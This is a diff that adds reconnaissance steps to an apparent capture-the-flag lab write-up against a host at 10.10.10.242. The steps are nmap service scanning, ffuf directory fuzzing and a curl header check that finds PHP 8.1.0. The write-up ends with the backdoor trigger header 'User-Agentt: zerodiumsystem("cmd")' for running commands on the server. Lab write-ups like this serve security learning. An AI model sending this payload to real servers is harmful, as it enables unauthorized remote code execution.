@@ -1,3 +1,22 @@
+We start with nmap:
+
+```
+nmap -sV -sC {ip address}
+```
+There are two ports open 80 and 22
+
+We enumerate the directories with ffuf:
+
+```
+ffuf -u http://10.10.10.242/FUZZ -w /usr/share/wordlists/dirb/common.txt
+```
+
+We find the version of php by using `curl`
+
+```
+curl -I http://10.10.10.242/index.php
+```
+
 We learn that the web-server is `php 8.1.0`
 
 If we pass a header value of `User-Agentt: zerodiumsystem("cmd")`, it should execute on the web-server.
